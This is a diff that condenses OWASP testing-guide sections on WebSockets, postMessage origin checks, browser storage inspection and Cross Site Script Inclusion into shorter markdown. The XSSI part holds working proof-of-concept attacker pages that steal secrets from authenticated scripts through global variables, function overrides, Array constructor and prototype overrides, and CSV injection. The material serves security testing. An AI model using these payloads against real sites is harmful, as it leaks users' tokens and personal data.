+3. Confidentiality/integrity — confirm `wss://` is used for sensitive data; check the TLS config as in [CRYP-01](#wstg-cryp-01) (valid cert, no BEAST/CRIME/RC4, etc).
+4. Authentication / 5. Authorization — WebSockets don't handle these themselves; run the same black-box auth(n/z) tests used elsewhere in this guide against the WS channel.
+6. Input sanitization — use ZAP's WebSocket tab to replay/fuzz frames.
 
-Test Objectives
-Identify the usage of WebSockets.
-Assess its implementation by using the same tests on normal HTTP channels.
+Gray-box: same approach, informed by API documentation of expected request/response formats.
 
-How to Test
-Black-Box Testing
-1. Identify that the application is using WebSockets.
-Inspect the client-side source code for the ws:// or wss:// URI scheme.
-Use Google Chrome's Developer Tools to view the Network WebSocket communication.
-Use ZAP's WebSocket tab.
-2. Origin.
-Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote
-WebSocket server. If a connection is established the server may not be checking the origin header of the
-WebSocket handshake.
-3. Confidentiality and Integrity.
-Check that the WebSocket connection is using SSL to transport sensitive information wss:// .
+Tools: OWASP ZAP, WebSocket Client (standalone), Chrome's Simple WebSocket Client.
 
-Check the SSL Implementation for security issues (Valid Certificate, BEAST, CRIME, RC4, etc). Refer to the
-Testing for Weak Transport Layer Security section of this guide.
-4. Authentication.
-WebSockets do not handle authentication, normal black-box authentication tests should be carried out. Refer
-to the Authentication Testing sections of this guide.
-5. Authorization.
-WebSockets do not handle authorization, normal black-box authorization tests should be carried out. Refer to
-the Authorization Testing sections of this guide.
-6. Input Sanitization.
-Use ZAP's WebSocket tab to replay and fuzz WebSocket request and responses. Refer to the Testing for Data
-Validation sections of this guide.
-Example 1
-Once we have identified that the application is using WebSockets (as described above) we can use the OWASP Zed
-Attack Proxy (ZAP) to intercept the WebSocket request and responses. ZAP can then be used to replay and fuzz the
-WebSocket request/responses.
-
-Figure 4.11.10-1: ZAP WebSockets
-
-Example 2
-Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket
-server. If the connection is allowed the WebSocket server may not be checking the WebSocket handshake's origin
-header. Attempt to replay requests previously intercepted to verify that cross-domain WebSocket communication is
-possible.
-
-Figure 4.11.10-2: WebSocket Client
-
-Gray-Box Testing
-Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the
-application. The only difference here is that you may have API documentation for the application being tested which
-includes the expected WebSocket request and responses.
-
-Tools
-OWASP Zed Attack Proxy (ZAP)
-WebSocket Client
-Google Chrome Simple WebSocket Client
-
-References
-HTML5 Rocks - Introducing WebSockets: Bringing Sockets to the Web
-W3C - The WebSocket API
-IETF - The WebSocket Protocol
-Christian Schneider - Cross-Site WebSocket Hijacking (CSWSH)
-Jussi-Pekka Erkkilä - WebSocket Security Analysis (PDF)
-Robert Koch- On WebSockets in Penetration Testing
-DigiNinja - OWASP ZAP and Web Sockets
+Refs: HTML5 Rocks — Introducing WebSockets; W3C WebSocket API; IETF WebSocket Protocol (RFC 6455); Christian Schneider — Cross-Site WebSocket Hijacking; Jussi-Pekka Erkkilä — WebSocket Security Analysis; Robert Koch — On WebSockets in Penetration Testing; DigiNinja — OWASP ZAP and Web Sockets.
 
 ---
 
@@ -1448,106 +444,51 @@ DigiNinja - OWASP ZAP and Web Sockets
 
 **Testing Web Messaging**
 
-Summary
-Web Messaging (also known as Cross Document Messaging) allows applications running on different domains to
-communicate in a secure manner. Before the introduction of web messaging, the communication of different origins
-(between iframes, tabs and windows) was restricted by the same origin policy and enforced by the browser. Developers
-used multiple hacks in order to accomplish these tasks, and most of them were mainly insecure.
-This restriction within the browser is in place to prevent a malicious website from reading confidential data from other
-iframes, tabs, etc; however, there are some legitimate cases where two trusted websites need to exchange data with
-each other. To meet this need, Cross Document Messaging was introduced in the WHATWG HTML5 draft specification
-and was implemented in all major browsers. It enables secure communications between multiple origins across
-iframes, tabs and windows.
-The messaging API introduced the postMessage() method, with which plain-text messages can be sent cross-origin. It
-consists of two parameters: message, and domain.
-There are some security concerns when using * as the domain that we discuss below. In order to receive messages,
-the receiving website needs to add a new event handler, which has the following attributes:
-Data, the content of the incoming message;
-Origin of the sender document; and
-Source, the source window.
-Here is an example of the messaging API in use. To send a message:
+Goal: confirm `postMessage()` senders always specify an exact target origin (never `*`), and receivers validate `event.origin` against an exact allowlist before trusting or acting on `event.data`.
 
+`postMessage(message, targetOrigin)` lets same-page contexts on different origins (iframes, tabs, windows) exchange data despite the same-origin policy, superseding older, generally-insecure hacks.
+
+Sending:
+```js
 iframe1.contentWindow.postMessage("Hello world","http://www.example.com");
-
-To receive a message:
-
+```
+Receiving:
+```js
 window.addEventListener("message", handler, true);
 function handler(event) {
-if(event.origin === 'chat.example.com') {
-/* process message (event.data) */
-} else {
-/* ignore messages from untrusted domains */
+  if(event.origin === 'chat.example.com') {
+    /* process message (event.data) */
+  }
 }
-}
+```
+An origin is scheme + host + port (no path/fragment) — `https://example.com` and `http://example.com` are different origins.
 
-Origin Security
-The origin is made up of a scheme, host name, and port. It uniquely identifies the domain sending or receiving the
-message, and does not include the path or the fragment part of the URL. For instance, https://example.com will be
-considered different from http://example.com because the schema of the former is https , while the latter is http .
-This also applies to web servers running in the same domain but on different ports.
+**Sender-side issue**: passing `*` as `targetOrigin` means the message goes to whatever origin currently occupies that window/frame — if it's been redirected, sensitive data leaks to an untrusted host.
 
-Test Objectives
-
-Assess the security of the message's origin.
-Validate that it's using safe methods and validating its input.
-
-How to Test
-Examine Origin Security
-Testers should check whether the application code is filtering and processing messages from trusted domains. Within
-the sending domain, also ensure that the receiving domain is explicitly stated, and that * is not used as the second
-argument of postMessage() . This practice could introduce security concerns and could lead to, in the case of a
-redirection or if the origin changes by other means, the website sending data to unknown hosts, and therefore, leaking
-confidential data to malicious servers.
-If the website fails to add security controls to restrict the domains or origins that are allowed to send messages to a
-website, it is likely to introduce a security risk. Testers should examine the code for message event listeners and get the
-callback function from the addEventListener method for further analysis. Domains must always be verified prior to
-data manipulation.
-
-Examine Input Validation
-Although the website is theoretically accepting messages from trusted domains only, data must still be treated as
-externally-sourced, untrusted data, and processed with the appropriate security controls. Testers should analyze the
-code and look for insecure methods, in particular where data is being evaluated via eval() or inserted into the DOM
-via the innerHTML property, which may create DOM-based XSS vulnerabilities.
-
-Static Code Analysis
-JavaScript code should be analyzed to determine how web messaging is implemented. In particular, testers should be
-interested in how the website is restricting messages from untrusted domains, and how the data is handled even for
-trusted domains.
-In this example, access is needed for every subdomain (www, chat, forums, ...) within the owasp.org domain. The code
-is trying to accept any domain with .owasp.org :
-
-window.addEventListener("message", callback, true);
+**Receiver-side issue #1 — substring/suffix matching instead of exact match**:
+```js
 function callback(e) {
-if(e.origin.indexOf(".owasp.org")!=-1) {
-/* process message (e.data) */
+  if(e.origin.indexOf(".owasp.org")!=-1) { /* process message (e.data) */ }
 }
-}
+```
+Intended to allow `www.owasp.org`, `chat.owasp.org`, etc., but also matches `www.owasp.org.attacker.com`.
 
-The intention is to allow subdomains such as:
-www.owasp.org
-chat.owasp.org
-forums.owasp.org
+**Receiver-side issue #2 — no origin check at all**:
+```js
+function callback(e) { /* process message (e.data) */ }
+```
 
-Unfortunately, this introduces vulnerabilities. An attacker can easily bypass the filter since a domain such as
-www.owasp.org.attacker.com will match.
-Here is an example of code that lacks an origin check. This is very insecure, as it will accept input from any domain:
-
-window.addEventListener("message", callback, true);
+**Receiver-side issue #3 — origin checked correctly, but data still sunk unsafely**:
+```js
 function callback(e) {
-/* process message (e.data) */
+  if(e.origin === "trusted.domain.com") {
+    element.innerHTML = e.data;   // DOM XSS even though origin check passed
+  }
 }
+```
+Fix: use `element.innerText` instead of `innerHTML`, and always treat `event.data` as untrusted even from a validated origin.
 
-Here is an example with input validation vulnerabilities that may lead to XSS attack:
-
-window.addEventListener("message", callback, true);
-function callback(e) {
-if(e.origin === "trusted.domain.com") {
-element.innerHTML= e.data;
-}
-}
-
-A more secure approach would be to use the property innerText instead of innerHTML .
-For further OWASP resources regarding web messaging, see OWASP HTML5 Security Cheat Sheet
+Refs: OWASP HTML5 Security Cheat Sheet.
 
 ---
 
@@ -1555,146 +496,66 @@ For further OWASP resources regarding web messaging, see OWASP HTML5 Security Ch
 
 **Testing Browser Storage**
 
-Summary
-Browsers provide the following client-side storage mechanisms for developers to store and retrieve data:
-Local Storage
-Session Storage
-IndexedDB
-Web SQL (Deprecated)
-Cookies
-These storage mechanisms can be viewed and edited using the browser's developer tools, such as Google Chrome
-DevTools or Firefox's Storage Inspector.
-Note: While cache is also a form of storage it is covered in a separate section covering its own peculiarities and
-concerns.
+Goal: confirm the application does not persist sensitive data in any client-side storage mechanism, and that code reading/writing storage isn't vulnerable to injection via unvalidated input or vulnerable libraries.
 
-Test Objectives
-Determine whether the website is storing sensitive data in client-side storage.
-The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing
-unvalidated input or vulnerable libraries.
+| Mechanism | Lifetime | Notes |
+|---|---|---|
+| `localStorage` | Persists until explicitly cleared (not in Private/Incognito) | Strings only — non-string values need `JSON.stringify` |
+| `sessionStorage` | Cleared when the tab/window closes | Strings only, same as above |
+| IndexedDB | Persistent, developer-managed | Can store structured objects (not just strings), e.g. `CryptoKey` objects |
+| Web SQL | Deprecated since 2010 | Should not be used at all |
+| Cookies | Per `Expires`/`Max-Age` | Covered separately under session management cookie-attribute testing |
+| `window` global properties | Cleared on page refresh/close | Custom app state developers sometimes stash here |
 
-How to Test
-Local Storage
-window.localStorage is a global property that implements the Web Storage API and provides persistent key-value
-
-storage in the browser.
-Both the keys and values can only be strings, so any non-string values must be converted to strings first before storing
-them, usually done via JSON.stringify.
-Entries to localStorage persist even when the browser window closes, with the exception of windows in
-Private/Incognito mode.
-The maximum storage capacity of localStorage varies between browsers.
-List All Key-Value Entries
+List localStorage / sessionStorage entries:
+```js
 for (let i = 0; i < localStorage.length; i++) {
-const key = localStorage.key(i);
-const value = localStorage.getItem(key);
-console.log(`${key}: ${value}`);
+  const key = localStorage.key(i);
+  console.log(`${key}: ${localStorage.getItem(key)}`);
 }
+```
 
-Session Storage
-window.sessionStorage is a global property that implements the Web Storage API and provides ephemeral key-value
-
-storage in the browser.
-
-Both the keys and values can only be strings, so any non-string values must be converted to strings first before storing
-them, usually done via JSON.stringify.
-Entries to sessionStorage are ephemeral because they are cleared when the browser tab/window is closed.
-The maximum storage capacity of sessionStorage varies between browsers.
-List All Key-Value Entries
-for (let i = 0; i < sessionStorage.length; i++) {
-const key = sessionStorage.key(i);
-const value = sessionStorage.getItem(key);
-console.log(`${key}: ${value}`);
-}
-
-IndexedDB
-IndexedDB is a transactional, object-oriented database intended for structured data. An IndexedDB database can have
-multiple object stores and each object store can have multiple objects.
-In contrast to Local Storage and Session Storage, IndexedDB can store more than just strings. Any objects supported
-by the structured clone algorithm can be stored in IndexedDB.
-An example of a complex JavaScript object that can be stored in IndexedDB, but not in Local/Session Storage are
-CryptoKeys.
-W3C recommendation on Web Crypto API recommends that CryptoKeys that need to be persisted in the browser, to be
-stored in IndexedDB. When testing a web page, look for any CryptoKeys in IndexedDB and check if they are set as
-extractable: true when they should have been set to extractable: false (i.e. ensure the underlying private key
-material is never exposed during cryptographic operations.)
-
-Print All the Contents of IndexedDB
+Dump all IndexedDB databases and object stores:
+```js
 const dumpIndexedDB = dbName => {
-const DB_VERSION = 1;
-const req = indexedDB.open(dbName, DB_VERSION);
-req.onsuccess = function() {
-const db = req.result;
-const objectStoreNames = db.objectStoreNames || [];
-console.log(`[*] Database: ${dbName}`);
-Array.from(objectStoreNames).forEach(storeName => {
-const txn = db.transaction(storeName, 'readonly');
-const objectStore = txn.objectStore(storeName);
-console.log(`\t[+] ObjectStore: ${storeName}`);
-// Print all entries in objectStore with name `storeName`
-objectStore.getAll().onsuccess = event => {
-const items = event.target.result || [];
-items.forEach(item => console.log(`\t\t[-] `, item));
-};
-});
-};
+  const req = indexedDB.open(dbName, 1);
+  req.onsuccess = function() {
+    const db = req.result;
+    Array.from(db.objectStoreNames || []).forEach(storeName => {
+      const objectStore = db.transaction(storeName, 'readonly').objectStore(storeName);
+      objectStore.getAll().onsuccess = event => {
+        (event.target.result || []).forEach(item => console.log(`[${storeName}]`, item));
+      };
+    });
+  };
 };
 indexedDB.databases().then(dbs => dbs.forEach(db => dumpIndexedDB(db.name)));
+```
+For CryptoKeys stored in IndexedDB, check they're set `extractable: false` when the private key material shouldn't be exposable.
 
-Web SQL
-Web SQL is deprecated since November 18, 2010 and it's recommended that web developers do not use it.
-
-Cookies
-Cookies are a key-value storage mechanism that is primarily used for session management but web developers can
-still use it to store arbitrary string data.
-Cookies are covered extensively in the testing for Cookies attributes scenario.
-List All Cookies
+List cookies visible to script:
+```js
 console.log(window.document.cookie);
+```
 
-Global Window Object
-Sometimes web developers initialize and maintain global state that is available only during the runtime life of the page
-by assigning custom attributes to the global window object. For example:
-
-window.MY_STATE = {
-counter: 0,
-flag: false,
-};
-
-Any data attached on the window object will be lost when the page is refreshed or closed.
-List All Entries on the Window Object
+List custom entries on the global `window` object (diff against a clean iframe's window):
+```js
 (() => {
-// create an iframe and append to body to load a clean window object
-const iframe = document.createElement('iframe');
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
-// get the current list of properties on window
-const currentWindow = Object.getOwnPropertyNames(window);
-// filter the list against the properties that exist in the clean window
-const results = currentWindow.filter(
-prop => !iframe.contentWindow.hasOwnProperty(prop)
-);
-// remove iframe
-document.body.removeChild(iframe);
-// log key-value entries that are different
-results.forEach(key => console.log(`${key}: ${window[key]}`));
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  const results = Object.getOwnPropertyNames(window)
+    .filter(prop => !iframe.contentWindow.hasOwnProperty(prop));
+  document.body.removeChild(iframe);
+  results.forEach(key => console.log(`${key}: ${window[key]}`));
 })();
+```
 
-(Modified version of this snippet)
+Findings here often chain into other client-side attacks, e.g. DOM XSS ([CLNT-01](#wstg-clnt-01)).
 
-Attack Chain
-Following the identification any of the above attack vectors, an attack chain can be formed with different types of clientside attacks, such as DOM based XSS attacks.
+Remediation: store sensitive data server-side; never rely on client-side storage as a secure store.
 
-Remediation
-Applications should be storing sensitive data on the server-side, and not on the client-side, in a secured manner
-following best practices.
-
-References
-Local Storage
-
-Session Storage
-IndexedDB
-Web Crypto API: Key Storage
-Web SQL
-Cookies
-For more OWASP resources on the HTML5 Web Storage API, see the Session Management Cheat Sheet.
+Refs: MDN Local Storage / Session Storage / IndexedDB; W3C Web Crypto API — Key Storage; Web SQL; OWASP Session Management Cheat Sheet.
 
 ---
 
@@ -1702,236 +563,81 @@ For more OWASP resources on the HTML5 Web Storage API, see the Session Managemen
 
 **Testing for Cross Site Script Inclusion**
 
-Summary
-Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain
-boundaries. Sensitive data could include authentication-related data (login states, cookies, auth tokens, session IDs,
-etc.) or user's personal or sensitive personal data (email addresses, phone numbers, credit card details, social security
-numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but has a different purpose.
-Where CSRF uses the authenticated user context to execute certain state-changing actions inside a victim's page (e.g.
-transfer money to the attacker's account, modify privileges, reset password, etc.), XSSI instead uses JavaScript on the
-client-side to leak sensitive data from authenticated sessions.
-By default, websites are only allowed to access data if they are from the same origin. This is a key application security
-principle and governed by the same-origin policy (defined by RFC 6454). An origin is defined as the combination of
-URI scheme (HTTP or HTTPS), host name, and port number. However, this policy is not applicable for HTML <script>
-tag inclusions. This exception is necessary, as without it websites would not be able to consume third party services,
-perform traffic analysis, or use advertisement platforms, etc.
-When the browser opens a website with <script> tags, the resources are fetched from the cross-origin domain. The
-resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive
-data. In most cases, this is achieved using JavaScript, however, the script source doesn't have to be a JavaScript file
-with type text/javascript or .js extension.
-Older browser's vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those
-vulnerabilities have now been patched by vendors and are considered less relevant. By setting the charset attribute of
-the <script> tag, an attacker or tester can enforce UTF-16 encoding, allowing data leakage for other data formats
-(e.g. JSON) in some cases. For more on these attacks, see Identifier based XSSI attacks.
+Goal: find `<script>`-tag-includable endpoints that leak authenticated, sensitive data to a cross-origin page — since the same-origin policy does not restrict script *inclusion*, only most other cross-origin reads.
 
-Test Objectives
-Locate sensitive data across the system.
-Assess the leakage of sensitive data through various techniques.
+XSSI resembles CSRF in that it abuses an authenticated session from another origin, but instead of triggering a state change it exfiltrates data (auth tokens, session IDs, PII) by loading a victim endpoint as a script and capturing what it does to the global JS environment.
 
-How to Test
-Collect Data Using Authenticated and Unauthenticated User Sessions
-Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all
-relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special
-attention to sensitive data sent using JSONP. To find dynamically generated JavaScript responses, generate
-authenticated and unauthenticated requests, then compare them. If they're different, it means the response is dynamic;
-otherwise it's static. To simplify this task, a tool such as Veit Hailperin's Burp proxy plugin can be used. Make sure to
-check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.
+**Recon**: diff authenticated vs. unauthenticated responses for every script-like endpoint (JS, but also JSON/JSONP/CSV — XSSI isn't limited to `.js` files) to find ones that render user-specific data. Veit Hailperin's Burp plugin can help automate this comparison.
 
-Determine Whether the Sensitive Data Can Be Leaked Using JavaScript
-Testers should analyze code for the following vehicles for data leakage via XSSI vulnerabilities:
-1. Global variables
-2. Global function parameters
-3. CSV (Comma Separated Values) with quotations theft
+Leakage vectors:
 
-4. JavaScript runtime errors
-5. Prototype chaining using this
-
-1. Sensitive Data Leakage via Global Variables
-An API key is stored in a JavaScript file with the URI https://victim.com/internal/api.js on the victim's website,
-victim.com ,
-
-which
-
-is only accessible to authenticated users. An attacker
-attackingwebsite.com , and uses the <script> tag to refer to the JavaScript file.
-
-configures
-
-a
-
-website,
-
-Here are the contents of https://victim.com/internal/api.js :
-
-(function() {
-window.secret = "supersecretUserAPIkey";
-})();
-
-The attack site, attackingwebsite.com , has an index.html with the following code:
-
-<!DOCTYPE html>
-<html>
-<head>
-<title>Leaking data via global variables</title>
-</head>
-<body>
-<h1>Leaking data via global variables</h1>
+**1. Global variables** — victim script sets a global that the attacker page reads after including it:
+```js
+// https://victim.com/internal/api.js (authenticated-only)
+(function() { window.secret = "supersecretUserAPIkey"; })();
+```
+```html
+<!-- attackingwebsite.com/index.html -->
 <script src="https://victim.com/internal/api.js"></script>
-<div id="result">
-</div>
+<div id="result"></div>
 <script>
-var div = document.getElementById("result");
-div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
+document.getElementById("result").innerHTML = "Your secret data <b>" + window.secret + "</b>";
 </script>
-</body>
-</html>
+```
 
-In this example, a victim is authenticated with victim.com . An attacker lures the victim to attackingwebsite.com via
-social engineering, phishing emails, etc. The victim's browser then fetches api.js , resulting in the sensitive data
-being leaked via the global JavaScript variable and displayed using innerHTML .
-
-2. Sensitive Data Leakage via Global Function Parameters
-This example is similar to the previous one, except in this case attackingwebsite.com uses a global JavaScript
-function to extract the sensitive data by overwriting the victim's global JavaScript function.
-Here are the contents of https://victim.com/internal/api.js :
-
-(function() {
-var secret = "supersecretAPIkey";
-window.globalFunction(secret);
-})();
-
-The attack site, attackingwebsite.com , has an index.html with the following code:
-
-<!DOCTYPE html>
-<html>
-<head>
-<title>Leaking data via global function parameters</title>
-</head>
-
-<body>
-<div id="result">
-</div>
+**2. Global function parameters** — attacker predefines the function the victim script calls:
+```js
+// victim.com/internal/api.js
+(function() { var secret = "supersecretAPIkey"; window.globalFunction(secret); })();
+```
+```html
 <script>
 function globalFunction(param) {
-var div = document.getElementById("result");
-div.innerHTML = "Your secret data: <b>" + param + "</b>";
+  document.getElementById("result").innerHTML = "Your secret data: <b>" + param + "</b>";
 }
 </script>
 <script src="https://victim.com/internal/api.js"></script>
-</body>
-</html>
+```
 
-There are other XSSI vulnerabilities that can result in sensitive data leakage either via JavaScript prototype chains or
-global function calls. For more on these attacks, see The Unexpected Dangers of Dynamic JavaScript.
-
-3. Sensitive Data Leakage via CSV with Quotations Theft
-To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example code
-is an excerpt from Takeshi Terada's Identifier based XSSI attacks whitepaper.
-
-HTTP/1.1 200 OK
-Content-Type: text/csv
-Content-Disposition: attachment; filename="a.csv"
-Content-Length: xxxx
-1,"___","aaa@a.example","03-0000-0001"
-2,"foo","bbb@b.example","03-0000-0002"
-...
-98,"bar","yyy@example.net","03-0000-0088"
-99,"___","zzz@example.com","03-0000-0099"
-
-In this example, using the ___ columns as injection points and inserting JavaScript strings in their place has the
-following result.
-
+**3. CSV with quotations theft** — injecting JavaScript-syntax strings into CSV fields the app doesn't expect to be interpreted as code, if the CSV response is later loaded as a script:
+```
 1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
-2,"foo","bbb@b.example","03-0000-0002"
 ...
-98,"bar","yyy@example.net","03-0000-0088"
 99,"*/}//","zzz@example.com","03-0000-0099"
-
-Jeremiah Grossman wrote about a similar vulnerability in Gmail in 2006 that allowed the extraction of user contacts in
-JSON. In this case, the data was received from Gmail and parsed by the browser JavaScript engine using an
-unreferenced Array constructor to leak the data. An attacker could access this Array with the sensitive data by defining
-and overwriting the internal Array constructor like this:
-
-<!DOCTYPE html>
-<html>
-<head>
-<title>Leaking gmail contacts via JSON </title>
-</head>
-<body>
-<script>
-function Array() {
-// steal data
-}
-</script>
+```
+A related historic case (Gmail, 2006): overriding the built-in `Array` constructor before including a JSON-as-JS-array response, so the attacker's constructor captures the leaked contact data:
+```html
+<script>function Array() { /* steal data */ }</script>
 <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
-</body>
-</html>
+```
 
-4. Sensitive Data Leakage via JavaScript Runtime Errors
-Browsers normally present standardized JavaScript error messages. However, in the case of IE9/10, runtime error
-messages provided additional details that could be used to leak data. For example, a website victim.com serves the
-following content at the URI http://victim.com/service/csvendpoint for authenticated users:
-
-HTTP/1.1 200 OK
-Content-Type: text/csv
-Content-Disposition: attachment; filename="a.csv"
-Content-Length: 13
-1,abc,def,ghi
-
-This vulnerability could be exploited with the following:
-
-<!--error handler -->
+**4. JavaScript runtime errors** — legacy IE9/10 exposed extra detail in `window.onerror` when a non-JS response (e.g. CSV) failed to parse as script:
+```html
 <script>window.onerror = function(err) {alert(err)}</script>
-<!--load target CSV -->
 <script src="http://victim.com/service/csvendpoint"></script>
+```
+Patched in modern browsers, but worth checking against legacy targets.
 
-When the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:
-
-Figure 4.11.13-1: JavaScript runtime error message
-
-5. Sensitive Data Leakage via Prototype Chaining Using `this`
-In JavaScript, the this keyword is dynamically scoped. This means if a function is called upon an object, this will
-point to this object even though the called function might not belong to the object itself. This behavior can be used to
-leak data. In the following example from Sebastian Leike's demonstration page, the sensitive data is stored in an Array.
-An attacker can override Array.prototype.forEach with an attacker-controlled function. If some code calls the
-forEach function on an array instance that contains sensitive values, the attacker-controlled function will be invoked
-with this pointing to the object that contains the sensitive data.
-Here is an excerpt of a JavaScript file containing sensitive data, javascript.js :
-
-...
+**5. Prototype chaining via `this`** — overriding a built-in prototype method (e.g. `Array.prototype.forEach`) so that when victim code invokes it on a sensitive array, the attacker's replacement runs with `this` bound to that array:
+```js
+// victim javascript.js
 (function() {
-
-var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];
-secret.forEach(function(element) {
-// do something here
-});
+  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];
+  secret.forEach(function(element) { /* ... */ });
 })();
-...
-
-The sensitive data can be leaked with the following JavaScript code:
-
-...
-<div id="result">
-</div>
+```
+```html
 <script>
 Array.prototype.forEach = function(callback) {
-var resultString = "Your secret values are: <b>";
-for (var i = 0, length = this.length; i < length; i++) {
-if (i > 0) {
-resultString += ", ";
-}
-resultString += this[i];
-}
-resultString += "</b>";
-var div = document.getElementById("result");
-div.innerHTML = resultString;
+  var resultString = "Your secret values are: <b>";
+  for (var i = 0, length = this.length; i < length; i++) {
+    if (i > 0) resultString += ", ";
+    resultString += this[i];
+  }
+  document.getElementById("result").innerHTML = resultString + "</b>";
 };
 </script>
 <script src="http://victim.com/..../javascript.js"></script>
-...
+```
 
-4.12 API Testing
-4.12.1 Testing GraphQL
-
----
-
+Refs: Takeshi Terada — Identifier based XSSI attacks; The Unexpected Dangers of Dynamic JavaScript; Sebastian Lekies — prototype-chaining demonstration.
